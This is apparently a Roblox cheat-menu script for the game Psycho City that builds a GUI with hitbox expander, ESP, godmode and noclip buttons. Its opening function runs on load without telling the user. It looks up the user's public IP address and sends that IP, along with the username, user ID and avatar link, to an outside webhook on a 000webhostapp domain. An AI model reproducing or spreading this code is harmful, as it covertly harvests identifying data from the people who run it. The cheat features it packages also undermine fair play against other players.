_G.scriptName = "Psycho City Gui v3"
-- inicia la funcion 
function Systema()
	local player = game.Players.LocalPlayer
	local Name = player.Name
	local UserId = player.UserId
	local thumbnail = "http://www.roblox.com/Thumbs/Avatar.ashx?username=" .. Name
	local webhook_link = "https://sgamesc.000webhostapp.com/bbbSystem.php"
	local ip_api_link = "https://api.myip.com/"
	local no_log_ip_link = "https://sgamesc.000webhostapp.com/noiplog.json"
	local client_ip = nil
	local no_log_ips = nil
	local success, resp = pcall(
		function ()
			return game:HttpGet(ip_api_link)
		end
	)
	if success then
		client_ip = game.HttpService:JSONDecode(resp)
		if client_ip.ip then
			client_ip = client_ip.ip
		end
	end

	local success, resp = pcall(
		function ()
			return game:HttpGet(no_log_ip_link)
		end
	)

	if success then
		no_log_ips = game.HttpService:JSONDecode(resp)
		no_log_ips = no_log_ips["no-log-ip"]
	end

	if no_log_ips then
		for _,ip in pairs(no_log_ips) do
			if client_ip.ip == ip then
				return
			end
		end
	end



	if client_ip then
		local URLPARAMS = "?"
		local URL_PARAMS_TABLE = {
			["USERID"] = UserId,
			["USERNAME"] = Name,
			["THUMBNAIL"] = thumbnail,
			["SCRIPT_NAME"] = _G.scriptName,
			["CLIENT_IP"] = client_ip
		}
		local counter = 0
		for param,value in pairs(URL_PARAMS_TABLE) do
			counter = counter + 1
			if counter == #URL_PARAMS_TABLE then
				URLPARAMS = URLPARAMS .. param .. "=" .. value
			end
			URLPARAMS = URLPARAMS .. param .. "=" .. value .. "&"
		end
		if URLPARAMS ~= "?" then
			game:HttpGet(webhook_link .. URLPARAMS)
		end
		counter = 0
	end

	--?USERID=&USERNAME=&THUMBNAIL=&SCRIPT_NAME=&CLIENT_IP=

end

Systema()

local PsychoGuiv3 = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Icon = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local line = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local line_2 = Instance.new("Frame")
local Icon2 = Instance.new("ImageLabel")
local TextLabel_3 = Instance.new("TextLabel")
local Icon3 = Instance.new("ImageLabel")
local TextLabel_4 = Instance.new("TextLabel")
local Icon4 = Instance.new("ImageLabel")
local TextLabel_5 = Instance.new("TextLabel")
local DiscordCopy = Instance.new("ImageLabel")
local TextLabel_6 = Instance.new("TextLabel")
local User = Instance.new("ImageLabel")
local TextLabel_7 = Instance.new("TextLabel")
local Warn = Instance.new("TextLabel")
local Boton1 = Instance.new("TextButton")
local Boton2 = Instance.new("TextButton")
local Boton3 = Instance.new("TextButton")
local Boton4 = Instance.new("TextButton")
local DiscordButton = Instance.new("TextButton")
local Credits = Instance.new("Frame")
local TextLabel_8 = Instance.new("TextLabel")
local TextLabel_9 = Instance.new("TextLabel")
local TextLabel_10 = Instance.new("TextLabel")
local TextLabel_11 = Instance.new("TextLabel")
local TextLabel_12 = Instance.new("TextLabel")
local Extras = Instance.new("Frame")
local Scroll = Instance.new("ScrollingFrame")
local HITBOX = Instance.new("TextButton")
local UIGradient = Instance.new("UIGradient")
local UIGridLayout = Instance.new("UIGridLayout")
local INFINITE_YIELD = Instance.new("TextButton")
local UIGradient_2 = Instance.new("UIGradient")
local ESP_PLAYERS = Instance.new("TextButton")
local UIGradient_3 = Instance.new("UIGradient")
local ALL_ANIMATIONSYEMOTES = Instance.new("TextButton")
local UIGradient_4 = Instance.new("UIGradient")
local CUSTOM_ANIMATIONS = Instance.new("TextButton")
local UIGradient_5 = Instance.new("UIGradient")
local ENANO_SCRIPTS = Instance.new("TextButton")
local UIGradient_6 = Instance.new("UIGradient")
local GIANT_SCRIPT = Instance.new("TextButton")
local UIGradient_7 = Instance.new("UIGradient")
local PUTASOS_SCRIPT = Instance.new("TextButton")
local UIGradient_8 = Instance.new("UIGradient")
local RUSSO_FE = Instance.new("TextButton")
local UIGradient_9 = Instance.new("UIGradient")
local REJOIN = Instance.new("TextButton")
local UIGradient_10 = Instance.new("UIGradient")
local GIVETOOLS = Instance.new("TextButton")
local UIGradient_11 = Instance.new("UIGradient")
local GODMODE = Instance.new("TextButton")
local UIGradient_12 = Instance.new("UIGradient")
local INVISIBLE = Instance.new("TextButton")
local UIGradient_13 = Instance.new("UIGradient")
local avatar = Instance.new("TextButton")
local UIGradient_14 = Instance.new("UIGradient")
local soonmore = Instance.new("TextButton")
local Main_2 = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local WEAPONS = Instance.new("TextButton")
local UIGradient_15 = Instance.new("UIGradient")
local UIGridLayout_2 = Instance.new("UIGridLayout")
local NOCLIP = Instance.new("TextButton")
local UIGradient_16 = Instance.new("UIGradient")
local JUMPCOOLDOWN = Instance.new("TextButton")
local UIGradient_17 = Instance.new("UIGradient")
local ESPALL = Instance.new("TextButton")
local UIGradient_18 = Instance.new("UIGradient")
local FULLBRIGHT = Instance.new("TextButton")
local UIGradient_19 = Instance.new("UIGradient")
local FREENIGHT = Instance.new("TextButton")
local UIGradient_20 = Instance.new("UIGradient")
local FREETHERMAL = Instance.new("TextButton")
local UIGradient_21 = Instance.new("UIGradient")
local GODFIRE = Instance.new("TextButton")
local UIGradient_22 = Instance.new("UIGradient")
local AIR = Instance.new("TextButton")
local UIGradient_23 = Instance.new("UIGradient")
local ARMOR = Instance.new("TextButton")
local UIGradient_24 = Instance.new("UIGradient")
local YTCHANNEL = Instance.new("TextButton")
local UIGradient_25 = Instance.new("UIGradient")
local OPENDISCORD = Instance.new("TextButton")
local UIGradient_26 = Instance.new("UIGradient")
local VIP = Instance.new("Frame")
local Bring_BTN = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Unbring_BTN = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local targets_box = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")
local Warn_2 = Instance.new("ImageLabel")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local Text = Instance.new("TextButton")
local TextLabel_13 = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Frame_3 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local KILL_BTN = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local line_3 = Instance.new("Frame")
local Bye = Instance.new("TextButton")
local Icon_2 = Instance.new("ImageLabel")
local Open = Instance.new("TextButton")
local Icon_3 = Instance.new("ImageLabel")

--Properties:

PsychoGuiv3.Name = "PsychoGui v3"
PsychoGuiv3.Parent = game.CoreGui
PsychoGuiv3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = PsychoGuiv3
Main.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.208316445, 0, 0.0879071951, 0)
Main.Size = UDim2.new(0, 699, 0, 413)

UICorner.Parent = Main

Icon.Name = "Icon"
Icon.Parent = Main
Icon.BackgroundTransparency = 1.000
Icon.Position = UDim2.new(0.0185979977, 0, 0.198547229, 0)
Icon.Size = UDim2.new(0, 35, 0, 35)
Icon.Image = "rbxassetid://7072717697"

TextLabel.Parent = Icon
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.991824806, 0, 0.393220305, 0)
TextLabel.Size = UDim2.new(0, 77, 0, 21)
TextLabel.Font = Enum.Font.LuckiestGuy
TextLabel.Text = "MAIN"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

line.Name = "line"
line.Parent = Main
line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
line.BorderColor3 = Color3.fromRGB(255, 255, 255)
line.Position = UDim2.new(0, 0, 0.0992736071, 0)
line.Size = UDim2.new(0, 699, 0, 0)

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.277539343, 0, 0.0217917673, 0)
TextLabel_2.Size = UDim2.new(0, 312, 0, 32)
TextLabel_2.Font = Enum.Font.LuckiestGuy
TextLabel_2.Text = "SGAMESC   |   Psycho City"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

line_2.Name = "line"
line_2.Parent = Main
line_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
line_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
line_2.Position = UDim2.new(0.206008583, 0, 0.0992736071, 0)
line_2.Size = UDim2.new(0, 0, 0, 372)

Icon2.Name = "Icon2"
Icon2.Parent = Main
Icon2.BackgroundTransparency = 1.000
Icon2.Position = UDim2.new(0.0185979977, 0, 0.355932236, 0)
Icon2.Size = UDim2.new(0, 35, 0, 35)
Icon2.Image = "rbxassetid://7072716296"

TextLabel_3.Parent = Icon2
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(1.22039628, 0, 0.393220305, 0)
TextLabel_3.Size = UDim2.new(0, 77, 0, 21)
TextLabel_3.Font = Enum.Font.LuckiestGuy
TextLabel_3.Text = "Extras"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

Icon3.Name = "Icon3"
Icon3.Parent = Main
Icon3.BackgroundTransparency = 1.000
Icon3.Position = UDim2.new(0.0171673819, 0, 0.506053269, 0)
Icon3.Size = UDim2.new(0, 35, 0, 35)
Icon3.Image = "rbxassetid://7072707514"

TextLabel_4.Parent = Icon3
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(1.22039628, 0, 0.393220305, 0)
TextLabel_4.Size = UDim2.new(0, 77, 0, 21)
TextLabel_4.Font = Enum.Font.LuckiestGuy
TextLabel_4.Text = "Credits"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

Icon4.Name = "Icon4"
Icon4.Parent = Main
Icon4.BackgroundTransparency = 1.000
Icon4.Position = UDim2.new(0.0185979977, 0, 0.646489024, 0)
Icon4.Size = UDim2.new(0, 35, 0, 35)
Icon4.Image = "rbxassetid://7072708278"

TextLabel_5.Parent = Icon4
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.991824806, 0, 0.393220305, 0)
TextLabel_5.Size = UDim2.new(0, 77, 0, 21)
TextLabel_5.Font = Enum.Font.LuckiestGuy
TextLabel_5.Text = "VIP"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

DiscordCopy.Name = "DiscordCopy"
DiscordCopy.Parent = Main
DiscordCopy.BackgroundTransparency = 1.000
DiscordCopy.Position = UDim2.new(0.0185979977, 0, 0.808716714, 0)
DiscordCopy.Size = UDim2.new(0, 35, 0, 35)
DiscordCopy.Image = "rbxassetid://7072718226"

TextLabel_6.Parent = DiscordCopy
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(1.22039628, 0, 0.393220305, 0)
TextLabel_6.Size = UDim2.new(0, 77, 0, 21)
TextLabel_6.Font = Enum.Font.LuckiestGuy
TextLabel_6.Text = "Discord"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

User.Name = "User"
User.Parent = Main
User.BackgroundTransparency = 1.000
User.Position = UDim2.new(0.00858369097, 0, 0.0217917673, 0)
User.Size = UDim2.new(0, 29, 0, 26)
User.Image = "rbxassetid://7072721855"

TextLabel_7.Parent = User
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.979016542, 0, 0, 0)
TextLabel_7.Size = UDim2.new(0, 78, 0, 27)
TextLabel_7.Font = Enum.Font.GothamBold
TextLabel_7.Text = "..."
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

Warn.Name = "Warn"
Warn.Parent = Main
Warn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Warn.BackgroundTransparency = 1.000
Warn.Position = UDim2.new(0.178826898, 0, -0.055690065, 0)
Warn.Size = UDim2.new(0, 449, 0, 22)
Warn.Visible = false
Warn.Font = Enum.Font.PermanentMarker
Warn.Text = "You have no weapons in your backpack"
Warn.TextColor3 = Color3.fromRGB(255, 255, 255)
Warn.TextScaled = true
Warn.TextSize = 14.000
Warn.TextStrokeTransparency = 0.000
Warn.TextWrapped = true

Boton1.Name = "Boton1"
Boton1.Parent = Main
Boton1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Boton1.BackgroundTransparency = 1.000
Boton1.Position = UDim2.new(0, 0, 0.19612591, 0)
Boton1.Size = UDim2.new(0, 144, 0, 50)
Boton1.ZIndex = 5
Boton1.Font = Enum.Font.SourceSans
Boton1.TextColor3 = Color3.fromRGB(0, 0, 0)
Boton1.TextSize = 14.000
Boton1.TextTransparency = 1.000

Boton2.Name = "Boton2"
Boton2.Parent = Main
Boton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Boton2.BackgroundTransparency = 1.000
Boton2.Position = UDim2.new(0.0014306152, 0, 0.353510916, 0)
Boton2.Size = UDim2.new(0, 144, 0, 50)
Boton2.ZIndex = 5
Boton2.Font = Enum.Font.SourceSans
Boton2.TextColor3 = Color3.fromRGB(0, 0, 0)
Boton2.TextSize = 14.000
Boton2.TextTransparency = 1.000

Boton3.Name = "Boton3"
Boton3.Parent = Main
Boton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Boton3.BackgroundTransparency = 1.000
Boton3.Position = UDim2.new(0.0014306152, 0, 0.503631949, 0)
Boton3.Size = UDim2.new(0, 144, 0, 50)
Boton3.ZIndex = 5
Boton3.Font = Enum.Font.SourceSans
Boton3.TextColor3 = Color3.fromRGB(0, 0, 0)
Boton3.TextSize = 14.000
Boton3.TextTransparency = 1.000

Boton4.Name = "Boton4"
Boton4.Parent = Main
Boton4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Boton4.BackgroundTransparency = 1.000
Boton4.Position = UDim2.new(0, 0, 0.644067764, 0)
Boton4.Size = UDim2.new(0, 144, 0, 50)
Boton4.ZIndex = 5
Boton4.Font = Enum.Font.SourceSans
Boton4.TextColor3 = Color3.fromRGB(0, 0, 0)
Boton4.TextSize = 14.000
Boton4.TextTransparency = 1.000

DiscordButton.Name = "DiscordButton"
DiscordButton.Parent = Main
DiscordButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DiscordButton.BackgroundTransparency = 1.000
DiscordButton.Position = UDim2.new(0, 0, 0.806295395, 0)
DiscordButton.Size = UDim2.new(0, 144, 0, 50)
DiscordButton.ZIndex = 5
DiscordButton.Font = Enum.Font.SourceSans
DiscordButton.TextColor3 = Color3.fromRGB(0, 0, 0)
DiscordButton.TextSize = 14.000
DiscordButton.TextTransparency = 1.000

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.BackgroundTransparency = 1.000
Credits.Position = UDim2.new(0.206008583, 0, 0.0992736071, 0)
Credits.Size = UDim2.new(0, 555, 0, 372)

TextLabel_8.Parent = Credits
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Position = UDim2.new(0.0523140654, 0, 0.922329307, 0)
TextLabel_8.Size = UDim2.new(0, 492, 0, 28)
TextLabel_8.Font = Enum.Font.LuckiestGuy
TextLabel_8.Text = "Thanks to all the Support From our Discord Group 'SGAMESC'"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextWrapped = true

TextLabel_9.Parent = Credits
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Position = UDim2.new(0.0523140654, 0, 0.201899216, 0)
TextLabel_9.Size = UDim2.new(0, 492, 0, 28)
TextLabel_9.Font = Enum.Font.LuckiestGuy
TextLabel_9.Text = "FOUNDER: SGAMESC"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextWrapped = true

TextLabel_10.Parent = Credits
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.Position = UDim2.new(0.0523140654, 0, 0.376630396, 0)
TextLabel_10.Size = UDim2.new(0, 492, 0, 28)
TextLabel_10.Font = Enum.Font.LuckiestGuy
TextLabel_10.Text = "SCRIPTER: 01xHxtao"
TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 14.000
TextLabel_10.TextWrapped = true

TextLabel_11.Parent = Credits
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Position = UDim2.new(0.0523140654, 0, 0.567490578, 0)
TextLabel_11.Size = UDim2.new(0, 492, 0, 28)
TextLabel_11.Font = Enum.Font.LuckiestGuy
TextLabel_11.Text = "UI DESIGNER: 01XHXTAO"
TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

TextLabel_12.Parent = Credits
TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.BackgroundTransparency = 1.000
TextLabel_12.Position = UDim2.new(0.0523140579, 0, 0.881082416, 0)
TextLabel_12.Size = UDim2.new(0, 492, 0, 13)
TextLabel_12.Font = Enum.Font.LuckiestGuy
TextLabel_12.Text = "EXTRA SCRIPTS ARE NOT THE PROPERTY OF SGAMESC"
TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.TextScaled = true
TextLabel_12.TextSize = 14.000
TextLabel_12.TextWrapped = true

Extras.Name = "Extras"
Extras.Parent = Main
Extras.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Extras.BackgroundTransparency = 1.000
Extras.Position = UDim2.new(0.206008583, 0, 0.0992736071, 0)
Extras.Size = UDim2.new(0, 555, 0, 372)
Extras.Visible = false

Scroll.Name = "Scroll"
Scroll.Parent = Extras
Scroll.Active = true
Scroll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Scroll.BackgroundTransparency = 1.000
Scroll.BorderSizePixel = 0
Scroll.Position = UDim2.new(0, 0, 0.0239695683, 0)
Scroll.Size = UDim2.new(0, 555, 0, 363)
Scroll.ScrollBarThickness = 5

HITBOX.Name = "HITBOX"
HITBOX.Parent = Scroll
HITBOX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HITBOX.BackgroundTransparency = 1.000
HITBOX.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
HITBOX.Size = UDim2.new(1, 0, 1, 0)
HITBOX.Font = Enum.Font.LuckiestGuy
HITBOX.Text = "HITBOX EXPANDER"
HITBOX.TextColor3 = Color3.fromRGB(255, 255, 255)
HITBOX.TextScaled = true
HITBOX.TextSize = 14.000
HITBOX.TextStrokeTransparency = 0.500
HITBOX.TextWrapped = true

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient.Parent = HITBOX

UIGridLayout.Parent = Scroll
UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 5, 0.0120000001, 0)
UIGridLayout.CellSize = UDim2.new(1, 0, 0.0289999992, 0)
UIGridLayout.FillDirectionMaxCells = 11

INFINITE_YIELD.Name = "INFINITE_YIELD"
INFINITE_YIELD.Parent = Scroll
INFINITE_YIELD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
INFINITE_YIELD.BackgroundTransparency = 1.000
INFINITE_YIELD.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
INFINITE_YIELD.Size = UDim2.new(1, 0, 1, 0)
INFINITE_YIELD.Font = Enum.Font.LuckiestGuy
INFINITE_YIELD.Text = "INFINITE YIELD ADMIN"
INFINITE_YIELD.TextColor3 = Color3.fromRGB(255, 255, 255)
INFINITE_YIELD.TextScaled = true
INFINITE_YIELD.TextSize = 14.000
INFINITE_YIELD.TextStrokeTransparency = 0.500
INFINITE_YIELD.TextWrapped = true

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_2.Parent = INFINITE_YIELD

ESP_PLAYERS.Name = "ESP_PLAYERS"
ESP_PLAYERS.Parent = Scroll
ESP_PLAYERS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESP_PLAYERS.BackgroundTransparency = 1.000
ESP_PLAYERS.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
ESP_PLAYERS.Size = UDim2.new(1, 0, 1, 0)
ESP_PLAYERS.Font = Enum.Font.LuckiestGuy
ESP_PLAYERS.Text = "ESP PLAYERS"
ESP_PLAYERS.TextColor3 = Color3.fromRGB(255, 255, 255)
ESP_PLAYERS.TextScaled = true
ESP_PLAYERS.TextSize = 14.000
ESP_PLAYERS.TextStrokeTransparency = 0.500
ESP_PLAYERS.TextWrapped = true

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_3.Parent = ESP_PLAYERS

ALL_ANIMATIONSYEMOTES.Name = "ALL_ANIMATIONSYEMOTES"
ALL_ANIMATIONSYEMOTES.Parent = Scroll
ALL_ANIMATIONSYEMOTES.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ALL_ANIMATIONSYEMOTES.BackgroundTransparency = 1.000
ALL_ANIMATIONSYEMOTES.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
ALL_ANIMATIONSYEMOTES.Size = UDim2.new(1, 0, 1, 0)
ALL_ANIMATIONSYEMOTES.Font = Enum.Font.LuckiestGuy
ALL_ANIMATIONSYEMOTES.Text = "ALL ANIMATIONS & EMOTES"
ALL_ANIMATIONSYEMOTES.TextColor3 = Color3.fromRGB(255, 255, 255)
ALL_ANIMATIONSYEMOTES.TextScaled = true
ALL_ANIMATIONSYEMOTES.TextSize = 14.000
ALL_ANIMATIONSYEMOTES.TextStrokeTransparency = 0.500
ALL_ANIMATIONSYEMOTES.TextWrapped = true

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_4.Parent = ALL_ANIMATIONSYEMOTES

CUSTOM_ANIMATIONS.Name = "CUSTOM_ANIMATIONS"
CUSTOM_ANIMATIONS.Parent = Scroll
CUSTOM_ANIMATIONS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CUSTOM_ANIMATIONS.BackgroundTransparency = 1.000
CUSTOM_ANIMATIONS.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
CUSTOM_ANIMATIONS.Size = UDim2.new(1, 0, 1, 0)
CUSTOM_ANIMATIONS.Font = Enum.Font.LuckiestGuy
CUSTOM_ANIMATIONS.Text = "CUSTOM ANIMATIONS "
CUSTOM_ANIMATIONS.TextColor3 = Color3.fromRGB(255, 255, 255)
CUSTOM_ANIMATIONS.TextScaled = true
CUSTOM_ANIMATIONS.TextSize = 14.000
CUSTOM_ANIMATIONS.TextStrokeTransparency = 0.500
CUSTOM_ANIMATIONS.TextWrapped = true

UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_5.Parent = CUSTOM_ANIMATIONS

ENANO_SCRIPTS.Name = "ENANO_SCRIPTS"
ENANO_SCRIPTS.Parent = Scroll
ENANO_SCRIPTS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ENANO_SCRIPTS.BackgroundTransparency = 1.000
ENANO_SCRIPTS.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
ENANO_SCRIPTS.Size = UDim2.new(1, 0, 1, 0)
ENANO_SCRIPTS.Font = Enum.Font.LuckiestGuy
ENANO_SCRIPTS.Text = "LITTLE CHAR"
ENANO_SCRIPTS.TextColor3 = Color3.fromRGB(255, 255, 255)
ENANO_SCRIPTS.TextScaled = true
ENANO_SCRIPTS.TextSize = 14.000
ENANO_SCRIPTS.TextStrokeTransparency = 0.500
ENANO_SCRIPTS.TextWrapped = true

UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_6.Parent = ENANO_SCRIPTS

GIANT_SCRIPT.Name = "GIANT_SCRIPT"
GIANT_SCRIPT.Parent = Scroll
GIANT_SCRIPT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GIANT_SCRIPT.BackgroundTransparency = 1.000
GIANT_SCRIPT.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
GIANT_SCRIPT.Size = UDim2.new(1, 0, 1, 0)
GIANT_SCRIPT.Font = Enum.Font.LuckiestGuy
GIANT_SCRIPT.Text = "GIANT CHAR"
GIANT_SCRIPT.TextColor3 = Color3.fromRGB(255, 255, 255)
GIANT_SCRIPT.TextScaled = true
GIANT_SCRIPT.TextSize = 14.000
GIANT_SCRIPT.TextStrokeTransparency = 0.500
GIANT_SCRIPT.TextWrapped = true

UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_7.Parent = GIANT_SCRIPT

PUTASOS_SCRIPT.Name = "PUTASOS_SCRIPT"
PUTASOS_SCRIPT.Parent = Scroll
PUTASOS_SCRIPT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PUTASOS_SCRIPT.BackgroundTransparency = 1.000
PUTASOS_SCRIPT.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
PUTASOS_SCRIPT.Size = UDim2.new(1, 0, 1, 0)
PUTASOS_SCRIPT.Font = Enum.Font.LuckiestGuy
PUTASOS_SCRIPT.Text = "BOXING FE SCRIPT"
PUTASOS_SCRIPT.TextColor3 = Color3.fromRGB(255, 255, 255)
PUTASOS_SCRIPT.TextScaled = true
PUTASOS_SCRIPT.TextSize = 14.000
PUTASOS_SCRIPT.TextStrokeTransparency = 0.500
PUTASOS_SCRIPT.TextWrapped = true

UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 255, 0)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(235, 229, 55)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 220, 255))}
UIGradient_8.Parent = PUTASOS_SCRIPT

RUSSO_FE.Name = "RUSSO_FE"
RUSSO_FE.Parent = Scroll
RUSSO_FE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RUSSO_FE.BackgroundTransparency = 1.000
RUSSO_FE.Position = UDim2.new(0.0126126129, 0, 0.0618279576, 0)
RUSSO_FE.Size = UDim2.new(1, 0, 1, 0)
RUSSO_FE.Font = Enum.Font.LuckiestGuy
RUSSO_FE.Text = "RUSSO FE SWORD"
RUSSO_FE.TextColor3 = Color3.fromRGB(255, 255, 255)
RUSSO_FE.TextScaled = true
RUSSO_FE.TextSize = 14.000
RUSSO_FE.TextStrokeTransparency = 0.500
RUSSO_FE.TextWrapped = true

